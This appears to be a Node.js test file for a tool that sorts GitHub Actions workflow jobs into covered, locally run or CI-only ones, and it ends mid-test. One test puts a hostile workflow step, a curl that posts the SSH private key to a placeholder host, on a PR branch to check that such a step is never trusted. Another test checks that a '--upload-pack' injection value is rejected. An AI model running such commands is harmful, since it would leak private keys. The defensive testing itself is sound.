import './helpers/test-home.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, writeFileSync, mkdirSync, mkdtempSync, rmSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { spawnSync } from 'node:child_process';
import { workflowRunsOnPr } from '../src/autopilot-core.mjs';
import { parseWorkflowYaml, sortCiJobs, ciJobsSummary, readCiJobs, cachedCiSummary, localJobPlan, localJobResult, localJobsRecord, localJobReds,
  ciMergeNote, missedCiJobs, recordMissedCi, readMissedCi, checkMissedCi, missedCiHeldLine } from '../src/autopilot-ci-jobs.mjs';

// Expected results come from issue #3260 (Serhan's decision B with CI job sorting, Nov 11) and the group 3 design,
// section E. The machine is fixed per test (a Linux runner with Node 22, unless a test says other), so the results
// are the same on the Mac and on the runner VM.
const root = new URL('../', import.meta.url).pathname;
const LINUX = { platform: 'linux', node: '22.16.0' };
const HEAD = 'a'.repeat(40), MERGE = 'b'.repeat(40), TIP = 'c'.repeat(40);
const sort = (files, extra = {}) => sortCiJobs({ files, base: 'main', testCommand: 'npm test', scripts: { test: 'node --test' }, machine: LINUX, ...extra });
const file = (name, text) => ({ name, text });
const byCheck = (result, check) => result.jobs.find(job => job.check === check);
const temp = t => { const dir = mkdtempSync(join(tmpdir(), 'pdd-ci-jobs-')); t.after(() => rmSync(dir, { recursive: true, force: true })); return dir; };
const ON_PR = 'on:\n  pull_request:\n  push:\n    branches: [main]\n';

test('sort: pdd\'s own ci.yml has the tests job and install-smoke as local jobs; the dispatch-only router is no PR CI', () => {
  const dir = join(root, '.github/workflows');
  const files = readdirSync(dir).sort().map(name => file(name, readFileSync(join(dir, name), 'utf8')));
  const pkg = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8'));
  const result = sortCiJobs({ files, base: 'main', testCommand: 'npm test', scripts: pkg.scripts, machine: LINUX });
  assert.deepEqual(result.jobs.map(job => [job.workflow, job.job, job.check, job.kind, job.suite]), [['ci.yml', 'public', 'tests', 'local', false], ['ci.yml', 'install-smoke', 'install-smoke', 'local', false]]);
  // The design's extras (node bin/pdd.mjs --help, npm pack --dry-run) run locally. Review R1 item 6: the always()
  // summary step runs too (it is not only a summary write). It reads the file that the test step writes with tee, so
  // the test step runs in the local job as well (rule 11); the shell check step and npm ci are setup.
  assert.deepEqual(byCheck(result, 'tests').steps.map(step => step.name), ['Run offline tests', 'Summarize test counts', 'node bin/pdd.mjs --help', 'npm pack --ignore-scripts --dry-run']);
  assert.deepEqual(byCheck(result, 'tests').commands.slice(2), ['node bin/pdd.mjs --help', 'npm pack --ignore-scripts --dry-run']);
  assert.equal(byCheck(result, 'install-smoke').commands.length, 1);
  assert.match(byCheck(result, 'install-smoke').commands[0], /npm pack --ignore-scripts --json/);
  assert.equal(result.summary, 'CI: 0 covered, 2 local, 0 CI-only');
  // The same workflow on a macOS machine: both jobs need a Linux runner.
  assert.equal(sortCiJobs({ files, base: 'main', testCommand: 'npm test', scripts: pkg.scripts, machine: { platform: 'darwin', node: '22.16.0' } }).summary, 'CI: 0 covered, 0 local, 2 CI-only (Linux)');
});

test('E5: pdd\'s own ci.yml skips draft PRs, runs again at ready_for_review, keeps cancel-in-progress, and still counts as PR CI', () => {
  const text = readFileSync(join(root, '.github/workflows/ci.yml'), 'utf8'), wf = parseWorkflowYaml(text);
  assert.deepEqual(wf.on.pull_request.types, ['opened', 'synchronize', 'reopened', 'ready_for_review']);
  for (const job of Object.values(wf.jobs)) assert.equal(job.if, "github.event_name != 'pull_request' || github.event.pull_request.draft == false");
  assert.equal(wf.concurrency['cancel-in-progress'], true);
  assert.equal(workflowRunsOnPr(text, 'pdd/core-1-x', 'main'), true);
});

test('sort: the ticket\'s summary example "CI: 2 covered, 1 local, 1 CI-only (CodeQL)"', () => {
  const ci = `name: CI\n${ON_PR}jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: npm\n      - run: npm ci\n      - run: npm test\n`
    + '  unit:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm run test\n'
    + '  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/cache@v4\n        with:\n          path: ~/.npm\n          key: npm\n      - run: npm ci\n      - run: npm run lint\n';
  const codeql = 'name: CodeQL\non:\n  pull_request:\n    branches: [main]\n  schedule:\n    - cron: "0 3 * * 1"\njobs:\n  analyze:\n    name: Analyze (${{ matrix.language }})\n    runs-on: ubuntu-latest\n    permissions:\n      security-events: write\n    strategy:\n      matrix:\n        language: [javascript-typescript]\n    steps:\n      - uses: actions/checkout@v4\n      - uses: github/codeql-action/init@v3\n        with:\n          languages: ${{ matrix.language }}\n      - uses: github/codeql-action/analyze@v3\n';
  const result = sort([file('ci.yml', ci), file('codeql.yml', codeql)]);
  assert.equal(result.summary, 'CI: 2 covered, 1 local, 1 CI-only (CodeQL)');
  assert.deepEqual(result.jobs.map(job => [job.check, job.kind]), [['test', 'covered'], ['unit', 'covered'], ['lint', 'local'], ['Analyze (javascript-typescript)', 'ci-only']]);
  assert.deepEqual(byCheck(result, 'lint').commands, ['npm run lint']);
  assert.deepEqual(byCheck(result, 'test').commands, ['npm test']);
  assert.equal(byCheck(result, 'Analyze (javascript-typescript)').why, 'uses github/codeql-action/init@v3');
  assert.equal(ciJobsSummary([]), 'CI: none');
});

test('sort: a step with a secret makes its job CI-only, and the local plan never holds it', () => {
  const ci = `${ON_PR}jobs:\n  publish-check:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm publish --dry-run\n        env:\n          NODE_AUTH_TOKEN: \${{ secrets.NPM_TOKEN }}\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n`;
  const result = sort([file('ci.yml', ci)]);
  assert.deepEqual(result.jobs.map(job => [job.check, job.kind, job.need]), [['publish-check', 'ci-only', 'secrets'], ['lint', 'local', null]]);
  assert.equal(result.summary, 'CI: 0 covered, 1 local, 1 CI-only (secrets)');
  const plan = localJobPlan({ jobs: result.jobs, head: HEAD, checkout: '/w/checkout', temp: '/w/temp', machine: LINUX });
  assert.deepEqual(plan.map(entry => entry.check), ['lint']);
  assert.ok(!plan.some(entry => /secrets|publish/.test(entry.command)));
  // A secret in the workflow's env reaches every job.
  assert.equal(sort([file('ci.yml', `${ON_PR}env:\n  TOKEN: \${{ secrets.X }}\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n`)]).jobs[0].need, 'secrets');
});

test('sort: a macOS matrix on a Linux machine gives one CI-only entry; a version matrix is local for this machine\'s Node only', () => {
  const os = `${ON_PR}jobs:\n  test:\n    runs-on: \${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: npm test\n`;
  const a = sort([file('ci.yml', os)]);
  assert.deepEqual(a.jobs.map(job => [job.check, job.kind, job.checks, job.need]), [['test (ubuntu-latest)', 'covered', ['test (ubuntu-latest)'], null], ['test (macos-latest)', 'ci-only', ['test (macos-latest)'], 'macOS']]);
  assert.equal(a.jobs[1].why, 'runs on macos-latest (this machine is Linux)');
  assert.equal(a.summary, 'CI: 1 covered, 0 local, 1 CI-only (macOS)');
  const versions = `${ON_PR}jobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node: [20, 22, 24]\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: \${{ matrix.node }}\n      - run: npm run build\n`;
  const b = sort([file('ci.yml', versions)]);
  assert.deepEqual(b.jobs.map(job => [job.check, job.kind, job.checks, job.need]), [['build (22)', 'local', ['build (22)'], null], ['build', 'ci-only', ['build (20)', 'build (24)'], 'Node 20, Node 24']]);
  assert.equal(b.jobs[1].why, 'uses Node 20 (this machine has Node 22.16.0), and 1 more');
  assert.deepEqual(b.jobs[0].matrix, { node: '22' });
  // include, exclude and an x version.
  const mixed = `${ON_PR}jobs:\n  t:\n    runs-on: \${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest]\n        node: ['22.x', '20.x']\n        exclude:\n          - os: windows-latest\n            node: '20.x'\n        include:\n          - os: ubuntu-latest\n            coverage: true\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: \${{ matrix.node }}\n      - run: npm test\n`;
  assert.deepEqual(sort([file('ci.yml', mixed)]).jobs.map(job => [job.check, job.kind, job.checks]), [['t (ubuntu-latest, 22.x, true)', 'covered', ['t (ubuntu-latest, 22.x, true)']],
    ['t', 'ci-only', ['t (ubuntu-latest, 20.x, true)', 't (windows-latest, 22.x)']]]);
});

test('sort: an unreadable file or job is CI-only (fail safe)', () => {
  const result = sort([{ name: 'gone.yml', text: null, error: 'git cat-file failed' }, file('anchor.yml', `${ON_PR}jobs:\n  a: &x\n    runs-on: ubuntu-latest\n`),
    file('tab.yml', `${ON_PR}jobs:\n\tlint:\n`), file('nojobs.yml', `${ON_PR}name: x\n`), file('badjob.yml', `${ON_PR}jobs:\n  lint: npm run lint\n  nosteps:\n    runs-on: ubuntu-latest\n`)]);
  assert.deepEqual(result.jobs.map(job => [job.workflow, job.job, job.kind, job.need]), [['gone.yml', null, 'ci-only', 'unreadable'], ['anchor.yml', null, 'ci-only', 'unreadable'],
    ['tab.yml', null, 'ci-only', 'unreadable'], ['nojobs.yml', null, 'ci-only', 'unreadable'], ['badjob.yml', 'lint', 'ci-only', 'unreadable'], ['badjob.yml', 'nosteps', 'ci-only', 'unreadable']]);
  assert.equal(result.jobs[0].why, 'Autopilot could not read the workflow file: git cat-file failed');
  assert.match(result.jobs[1].why, /line 6: "&" \(an anchor/);
  assert.equal(result.summary, 'CI: 0 covered, 0 local, 6 CI-only (unreadable)');
  // More than 50 files: one entry, nothing read.
  const many = sort(Array.from({ length: 51 }, (_, i) => file(`w${i}.yml`, null)));
  assert.deepEqual(many.jobs.map(job => [job.workflow, job.need, job.why]), [[null, 'too many workflows', 'the base has 51 workflow files (more than 50)']]);
});

test('sort: a job condition decides for a ready PR; one that Autopilot cannot check is CI-only', () => {
  const job = (id, cond) => `  ${id}:\n    if: ${cond}\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n`;
  const ci = `${ON_PR}jobs:\n${job('draft', "github.event_name != 'pull_request' || github.event.pull_request.draft == false")}${job('push-only', "github.event_name == 'push'")}`
    + `${job('wrapped', '${{ !github.event.pull_request.draft }}')}${job('unknown', "contains(github.event.head_commit.message, 'x')")}${job('actor', "github.actor == 'me'")}`;
  const result = sort([file('ci.yml', ci)]);
  assert.deepEqual(result.jobs.map(entry => [entry.check, entry.kind, entry.need]), [['draft', 'local', null], ['wrapped', 'local', null], ['unknown', 'ci-only', 'condition'], ['actor', 'ci-only', 'condition']]);
});

test('sort: steps that need GitHub (actions, services, deploys, other shells, unknown expressions, GITHUB_ENV, sudo) make the job CI-only', () => {
  const steps = body => `    runs-on: ubuntu-latest\n    steps:\n${body}`;
  const ci = `${ON_PR}jobs:\n`
    + `  deploy:\n    environment: production\n${steps('      - run: ./deploy.sh\n')}`
    + `  db:\n    services:\n      postgres:\n        image: postgres\n${steps('      - run: npm run db-test\n')}`
    + `  pwsh:\n${steps('      - run: Get-ChildItem\n        shell: pwsh\n')}`
    + `  outputs:\n${steps('      - run: echo ${{ steps.meta.outputs.tag }}\n')}`
    + `  env-pass:\n${steps('      - run: echo "X=1" >> "$GITHUB_ENV"\n      - run: npm run lint\n')}`
    + `  root:\n${steps('      - run: sudo make install\n')}`
    + `  mixed-install:\n${steps('      - run: |\n          sudo apt-get install -y jq\n          npm run lint\n')}`
    + `  docker:\n${steps('      - uses: docker://alpine:3\n')}`
    + '  reuse:\n    uses: ./.github/workflows/shared.yml\n'
    + `  boxed:\n    container: node:22\n${steps('      - run: npm run lint\n')}`;
  const result = sort([file('ci.yml', ci)]);
  assert.deepEqual(result.jobs.map(job => [job.check, job.need]), [['deploy', 'environment'], ['db', 'services'], ['pwsh', 'shell'], ['outputs', 'expression'], ['env-pass', 'GITHUB_ENV'],
    ['root', 'sudo'], ['mixed-install', 'system packages'], ['docker', 'docker image'], ['reuse', 'reusable workflow'], ['boxed', 'container']]);
  assert.ok(result.jobs.every(job => job.kind === 'ci-only'));
  assert.equal(result.jobs[3].why, 'uses the expression ${{ steps.meta.outputs.tag }}');
});

test('sort: setup steps never run; the known expressions, defaults and working directories carry into the local steps', () => {
  const ci = `${ON_PR}env:\n  LEVEL: strict\ndefaults:\n  run:\n    shell: bash\njobs:\n  check:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        part: [api]\n    defaults:\n      run:\n        working-directory: \${{ github.workspace }}/packages/\${{ matrix.part }}\n    steps:\n`
    + '      - run: node --version\n      - run: |\n          if ! command -v jq; then\n            sudo apt-get update\n            sudo apt-get install -y jq\n          fi\n      - run: yarn --frozen-lockfile\n'
    + '      - name: Types\n        run: npm run typecheck -- --level "${{ env.LEVEL }}" --os ${{ runner.os }} --part ${{ matrix.part }}\n        env:\n          OUT: ${{ runner.temp }}/types\n'
    + '      - run: npm run flaky\n        continue-on-error: true\n      - if: failure()\n        run: echo failed\n      - if: always()\n        run: echo done >> "$GITHUB_STEP_SUMMARY"\n';
  const [entry] = sort([file('ci.yml', ci)]).jobs;
  assert.equal(entry.kind, 'local');
  assert.equal(entry.check, 'check (api)');
  assert.deepEqual(entry.steps, [{ name: 'Types', shell: 'bash', script: 'npm run typecheck -- --level "${{ env.LEVEL }}" --os ${{ runner.os }} --part ${{ matrix.part }}',
    workingDirectory: 'packages/api', env: { LEVEL: 'strict', OUT: '${{ runner.temp }}/types' } }]);
  const [plan] = localJobPlan({ jobs: [entry], head: HEAD, checkout: '/w/co', temp: '/w/tmp', machine: LINUX });
  assert.deepEqual(plan.steps[0].args, ['--noprofile', '--norc', '-eo', 'pipefail', '-c', 'npm run typecheck -- --level "strict" --os Linux --part api']);
  assert.equal(plan.steps[0].cwd, '/w/co/packages/api');
  assert.equal(plan.steps[0].env.OUT, '/w/tmp/job-1/runner-temp/types');
  // A working directory outside the checkout is CI-only.
  assert.equal(sort([file('ci.yml', `${ON_PR}jobs:\n  up:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n        working-directory: ../other\n`)]).jobs[0].need, 'working directory');
});

test('YAML subset: block scalars, compact maps, flow collections, quotes and comments', () => {
  const value = parseWorkflowYaml(['---', '# a comment', 'a: plain text # gone', "b: 'it''s'", 'c: "tab\\there \\u0041"', 'd: [1, two, "3, 4", {e: f}]', 'g: {h: [i, j], k: }',
    'list:', '- x', '- y: 1', '  z: 2', '- - nested', '  - more', 'lit: |-', '  line 1', '    indented', '', '  line 3', 'folded: >', '  one', '  two', '', '  three', 'keep: |+', '  k', '', 'empty:', 'bool: false', 'nil: ~', '...'].join('\n'));
  assert.deepEqual(value, { a: 'plain text', b: "it's", c: 'tab\there A', d: ['1', 'two', '3, 4', { e: 'f' }], g: { h: ['i', 'j'], k: null },
    list: ['x', { y: '1', z: '2' }, ['nested', 'more']], lit: 'line 1\n  indented\n\nline 3', folded: 'one two\nthree\n', keep: 'k\n\n', empty: null, bool: false, nil: null });
  const refused = { 'a: *x': /alias/, 'a: !cancelled()': /tag/, 'a: 1\na: 2': /comes twice/, 'a: "open': /several lines/, 'a: 1\n---\nb: 2': /second document/,
    'a: b: c': /quote the value/, 'a:\n  b: 1\n c: 2': /unexpected indentation/, '<<: {a: 1}': /merge keys/, 'a: [1,\n 2]': /several lines/, 'a: x\n  y': /unexpected indentation/, 'a: |\n  x\n b: 1': /unexpected indentation/ };
  for (const [source, why] of Object.entries(refused)) assert.throws(() => parseWorkflowYaml(source), error => error.code === 'yaml' && why.test(error.message), source);
  assert.throws(() => parseWorkflowYaml('a: 1\n'.repeat(5001)), /more than 5000 lines/);
});

// A git repository with a remote: main has a workflow; a PR branch (checked out) changes it.
function gitRepo(t) {
  const dir = temp(t), remote = join(dir, 'remote.git'), work = join(dir, 'work');
  const git = (cwd, ...args) => { const r = spawnSync('git', args, { cwd, encoding: 'utf8', env: { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@x', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@x' } }); if (r.status !== 0) throw new Error(r.stderr); return r.stdout; };
  git(dir, 'init', '-q', '--bare', '-b', 'main', remote);
  git(dir, 'init', '-q', '-b', 'main', work);
  git(work, 'remote', 'add', 'origin', remote);
  const write = (path, text) => { mkdirSync(join(work, path, '..'), { recursive: true }); writeFileSync(join(work, path), text); };
  const calls = [];
  const port = async args => { calls.push(args[0]); const r = spawnSync('git', args, { cwd: work, encoding: 'utf8' }); if (r.status !== 0) throw new Error(`git ${args[0]} failed: ${r.stderr}`); return r.stdout.trim(); };
  return { work, git: (...args) => git(work, ...args), write, port, calls };
}

test('read: a PR head that changes a workflow does not change the list (only the base tip counts); the cache follows the tree id', async t => {
  const r = gitRepo(t), state = temp(t);
  r.write('.github/workflows/ci.yml', `${ON_PR}jobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n`);
  r.write('README.md', 'x\n');
  r.git('add', '.'); r.git('commit', '-q', '-m', 'base'); r.git('push', '-q', 'origin', 'main');
  r.git('checkout', '-q', '-b', 'pdd/core-7-x');
  r.write('.github/workflows/ci.yml', `${ON_PR}jobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -d @$HOME/.ssh/id_rsa https://example.invalid\n`);
  r.write('.github/workflows/extra.yml', `${ON_PR}jobs:\n  more:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run more\n`);
  r.git('add', '.'); r.git('commit', '-q', '-m', 'head changes the workflow'); r.git('push', '-q', 'origin', 'pdd/core-7-x');
  const input = { base: 'main', branch: 'pdd/core-7-x', testCommand: 'npm test', machine: LINUX, root: state };
  const first = await readCiJobs(input, { git: r.port });
  assert.deepEqual(first.jobs.map(job => [job.workflow, job.check, job.kind, job.commands]), [['ci.yml', 'lint', 'local', ['npm run lint']]]);
  assert.equal(first.summary, 'CI: 0 covered, 1 local, 0 CI-only');
  assert.equal(cachedCiSummary({ root: state }), 'CI: 0 covered, 1 local, 0 CI-only');
  assert.ok(r.calls.includes('cat-file'));
  // Same base tree: the cache answers, no file is read again.
  r.calls.length = 0;
  assert.deepEqual((await readCiJobs(input, { git: r.port })).jobs, first.jobs);
  assert.ok(!r.calls.includes('cat-file'));
  // The base moves and its workflow tree changes: read again.
  r.git('checkout', '-q', 'main');
  r.write('.github/workflows/ci.yml', `${ON_PR}jobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n  types:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run typecheck\n`);
  r.git('commit', '-q', '-am', 'base adds a job'); r.git('push', '-q', 'origin', 'main');
  r.calls.length = 0;
  const moved = await readCiJobs(input, { git: r.port });
  assert.deepEqual(moved.jobs.map(job => job.check), ['lint', 'types']);
  assert.ok(r.calls.includes('cat-file'));
  assert.notEqual(moved.tree, first.tree);
  await assert.rejects(readCiJobs({ ...input, base: '--upload-pack=x' }, { git: r.port }), /base must be a branch name/);
});

test('read: no workflow folder is no CI; a git error and a large file are CI-only', async t => {
  const r = gitRepo(t);
  r.write('README.md', 'x\n'); r.git('add', '.'); r.git('commit', '-q', '-m', 'base'); r.git('push', '-q', 'origin', 'main');
  assert.deepEqual(await readCiJobs({ base: 'main' }, { git: r.port }), { tree: null, jobs: [], summary: 'CI: none' });
  const failed = await readCiJobs({ base: 'main' }, { git: async () => { throw new Error('git rev-parse failed: no such ref'); } });
  assert.deepEqual(failed.jobs.map(job => [job.workflow, job.kind, job.need]), [[null, 'ci-only', 'unreadable']]);
  assert.equal(failed.summary, 'CI: 0 covered, 0 local, 1 CI-only (unreadable)');
  r.write('.github/workflows/big.yml', `${ON_PR}# ${'x'.repeat(256 * 1024)}\njobs: {}\n`);
  r.git('add', '.'); r.git('commit', '-q', '-m', 'big'); r.git('push', '-q', 'origin', 'main');
  const big = await readCiJobs({ base: 'main' }, { git: r.port });
  assert.deepEqual(big.jobs.map(job => [job.workflow, job.why]), [['big.yml', 'Autopilot could not read the workflow file: the file is larger than 256 KiB']]);
});

// Review round 1 (Codex), items 4 to 6, and their probe (core/g3/r1-probes/ci-probe.test.mjs): expected results from
// the review and the group lead's rules, not from the code.
const oneJob = (body, top = '') => sort([file('ci.yml', `${ON_PR}${top}jobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n${body}`)]).jobs[0];
function runLocal(entry, dir) {
  const [plan] = localJobPlan({ jobs: [entry], head: HEAD, checkout: dir, temp: join(dir, 'tmp'), machine: LINUX });
  const r = spawnSync('/bin/bash', ['-c', plan.command], { cwd: dir, encoding: 'utf8', env: { ...process.env, ...plan.env } });
  return localJobResult(plan, { exit: { code: r.status, signal: r.signal }, log: `${r.stdout}${r.stderr}` });
}

test('review R1 item 4: the full test command in another directory, shell or environment is no covered job; it runs there', t => {
  const dir = temp(t);
  mkdirSync(join(dir, 'nested'));
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts: { test: 'node -e "process.exit(0)"' } }));
  writeFileSync(join(dir, 'nested/package.json'), JSON.stringify({ scripts: { test: 'node -e "process.exit(1)"' } }));
  const nested = oneJob('      - run: npm test\n        working-directory: nested\n');
  assert.deepEqual([nested.kind, nested.suite, nested.commands, nested.steps[0].workingDirectory], ['local', false, ['npm test'], 'nested']);
  // The nested package's tests fail: the local job is red, as CI would be.
  assert.deepEqual([runLocal(nested, dir).state, runLocal(nested, dir).step], ['fail', 'npm test']);
  assert.equal(oneJob('      - run: npm test\n        shell: sh\n').kind, 'local');
  assert.equal(oneJob('      - run: npm test\n        env:\n          NODE_ENV: production\n').kind, 'local');
  assert.equal(oneJob('      - run: npm test\n', 'env:\n  SHARD: 2\n').kind, 'local');
  assert.equal(oneJob('      - run: npm test\n', 'defaults:\n  run:\n    working-directory: nested\n').kind, 'local');
  // The full suite's own context stays covered.
  for (const body of ['      - run: npm test\n', '      - run: npm test\n        shell: bash\n        working-directory: .\n', '      - run: npm test\n        env:\n          CI: true\n'])
    assert.equal(oneJob(body).kind, 'covered', body);
});

test('review R1 item 5: a step that writes state is kept and run; only a step that changes nothing is setup', t => {
  const dir = temp(t);
  writeFileSync(join(dir, 'mode'), 'relaxed\n');
  // CI writes "strict" and then checks for "relaxed": the workflow fails, so the local job must fail too.
  const entry = oneJob('      - run: echo strict > mode\n      - run: test "$(cat mode)" = relaxed\n');
  assert.deepEqual([entry.kind, entry.commands], ['local', ['echo strict > mode', 'test "$(cat mode)" = relaxed']]);
  assert.deepEqual([runLocal(entry, dir).state, runLocal(entry, dir).step], ['fail', 'test "$(cat mode)" = relaxed']);
  const kept = ['echo "dir=$(npm config get cache)" >> "$GITHUB_OUTPUT"', "printf '%s' a | tee list.txt", 'echo x >| out.txt', 'X=$(date)', 'command -v jq > where.txt', 'echo `id`'];
  for (const command of kept) assert.deepEqual(oneJob(`      - run: ${JSON.stringify(command)}\n`).commands, [command], command);
  const nothing = ['echo hello', 'echo x > /dev/null', 'echo "## Report" >> "$GITHUB_STEP_SUMMARY"', 'node --version 2>&1', 'printf "%s\\n" done >&2', 'export A=1 B'];
  for (const command of nothing) assert.deepEqual([oneJob(`      - run: ${JSON.stringify(command)}\n`).kind, oneJob(`      - run: ${JSON.stringify(command)}\n`).why], ['covered', 'runs only setup steps'], command);
});

test('review R1 item 6: an always() step runs like any other step; only a pure summary write is no command', t => {
  const dir = temp(t);
  const failing = oneJob('      - run: npm test\n      - if: always()\n        run: |\n          node -e "process.exit(1)"\n          echo summary >> "$GITHUB_STEP_SUMMARY"\n');
  assert.deepEqual([failing.kind, failing.suite, failing.commands], ['local', true, ['node -e "process.exit(1)"\necho summary >> "$GITHUB_STEP_SUMMARY"\n']]);
  assert.equal(runLocal(failing, dir).state, 'fail');
  assert.equal(oneJob('      - run: npm test\n      - if: always()\n        run: echo "### tests passed" >> "$GITHUB_STEP_SUMMARY"\n').kind, 'covered');
  assert.equal(oneJob('      - run: npm test\n      - if: \'!cancelled()\'\n        run: npm run lint\n').kind, 'local');
});

test('a suite step that writes a file runs locally when a later step runs locally; with none it stays covered', () => {
  const tee = '      - run: npm test 2>&1 | tee "$RUNNER_TEMP/tests.tap"\n';
  const read = oneJob(`${tee}      - run: grep -c "^ok" "$RUNNER_TEMP/tests.tap"\n`);
  assert.deepEqual([read.kind, read.suite, read.commands], ['local', false, ['npm test 2>&1 | tee "$RUNNER_TEMP/tests.tap"', 'grep -c "^ok" "$RUNNER_TEMP/tests.tap"']]);
  assert.equal(oneJob(`${tee}      - if: always()\n        run: echo done >> "$GITHUB_STEP_SUMMARY"\n`).kind, 'covered');
  // A suite step that writes nothing stays covered next to a local command.
  assert.deepEqual([oneJob('      - run: npm test\n      - run: npm run lint\n').suite, oneJob('      - run: npm test\n      - run: npm run lint\n').commands], [true, ['npm run lint']]);
});

const lintOnly = sort([file('ci.yml', `${ON_PR}jobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n      - run: npm run lint\n  codeql:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: github/codeql-action/analyze@v3\n`)]).jobs;

test('local jobs: the plan runs each step in order with CI=true and the GitHub folders; the record reads pass, fail and a missing tool', t => {
  const dir = temp(t), checkout = join(dir, 'checkout'), scratch = join(dir, 'tmp');
  mkdirSync(join(checkout, 'sub'), { recursive: true });
  const job = (id, body) => `  ${id}:\n    runs-on: ubuntu-latest\n    steps:\n${body}`;
  const ci = `${ON_PR}jobs:\n`
    + job('good', '      - name: Write\n        run: echo "$CI $GREETING" > "$RUNNER_TEMP/out.txt" && cp "$RUNNER_TEMP/out.txt" "$GITHUB_WORKSPACE/out.txt"\n        env:\n          GREETING: it\'s ${{ runner.os }}\n      - run: test "$(pwd)" = "$GITHUB_WORKSPACE/sub" && echo ok >> "$GITHUB_STEP_SUMMARY"\n        working-directory: sub\n        shell: sh\n')
    + job('bad', '      - run: ls > /dev/null\n      - name: Break\n        run: |\n          ls > /dev/null\n          echo "token ghp_' + 'a'.repeat(36) + '"\n          exit 3\n      - run: ls never-here\n')
    + job('tool', '      - run: pdd-ci-jobs-no-such-tool --check\n');
  const jobs = sort([file('ci.yml', ci)]).jobs, plan = localJobPlan({ jobs, head: HEAD, checkout, temp: scratch, machine: LINUX });
  assert.deepEqual(plan.map(entry => [entry.key, entry.cwd, entry.env.CI, entry.env.GITHUB_WORKSPACE, entry.env.RUNNER_TEMP]), [
    ['ci.yml#good', checkout, 'true', checkout, join(scratch, 'job-1', 'runner-temp')], ['ci.yml#bad', checkout, 'true', checkout, join(scratch, 'job-2', 'runner-temp')],
    ['ci.yml#tool', checkout, 'true', checkout, join(scratch, 'job-3', 'runner-temp')]]);
  assert.deepEqual(plan[0].steps.map(step => [step.name, step.command, step.args.slice(0, -1), step.cwd]), [['Write', 'bash', ['-e', '-c'], checkout], ['test "$(pwd)" = "$GITHUB_WORKSPACE/sub" && echo ok >> "$GITHUB_STEP_SUMMARY"', 'sh', ['-e', '-c'], join(checkout, 'sub')]]);
  const runs = {};
  for (const entry of plan) {
    const r = spawnSync('/bin/bash', ['-c', entry.command], { cwd: entry.cwd, encoding: 'utf8', env: { PATH: process.env.PATH, HOME: process.env.HOME, ...entry.env } });
    runs[entry.key] = { exit: { code: r.status, signal: r.signal }, log: `${r.stdout}${r.stderr}` };
  }
  assert.equal(readFileSync(join(checkout, 'out.txt'), 'utf8'), "true it's Linux\n");
  assert.equal(readFileSync(plan[0].env.GITHUB_STEP_SUMMARY, 'utf8'), 'ok\n');
  assert.match(runs['ci.yml#good'].log, /pdd-ci-local: all 2 steps passed/);
  assert.doesNotMatch(runs['ci.yml#bad'].log, /never/);
  const record = localJobsRecord({ head: HEAD, plan, runs, at: 5 });
  assert.deepEqual(record.jobs.map(row => [row.check, row.state, row.step, row.exit, row.tool]), [['good', 'pass', null, null, null], ['bad', 'fail', 'Break', 3, null], ['tool', 'could-not-run', 'pdd-ci-jobs-no-such-tool --check', 127, 'pdd-ci-jobs-no-such-tool']]);
  assert.equal(record.jobs[2].why, 'pdd-ci-jobs-no-such-tool is missing on this machine');
  assert.match(record.jobs[1].tail, /token \[redacted\]/);
  assert.doesNotMatch(record.jobs[1].tail, /ghp_/);
  const reds = localJobReds(record);
  assert.equal(reds.length, 1);
  assert.ok(reds[0].startsWith(`CI job bad failed when Autopilot ran it on this machine for head ${HEAD.slice(0, 7)} (CI did not start): step "Break" exited with 3.\nLast lines:\n`));
  // No run, or a run killed by a signal: could not run (it counts as CI-only, never as a pass).
  assert.deepEqual(localJobResult(plan[0], null).state, 'could-not-run');
  assert.equal(localJobResult(plan[0], { exit: { code: null, signal: 'SIGKILL' }, log: '' }).why, 'the local run did not finish (SIGKILL)');
  assert.throws(() => localJobPlan({ jobs, head: 'HEAD', checkout, temp: scratch }), /head must be 40 hex digits/);
  assert.throws(() => localJobPlan({ jobs, head: HEAD, checkout: 'relative', temp: scratch }), /absolute paths/);
});

test('merge note: CI did not start, the covered jobs, each local result and each CI-only job (the design\'s lines)', () => {
  const plan = localJobPlan({ jobs: lintOnly, head: HEAD, checkout: '/w/co', temp: '/w/tmp', machine: LINUX });
  const record = localJobsRecord({ head: HEAD, plan, runs: { 'ci.yml#tests': { exit: { code: 0 }, log: '' } } });
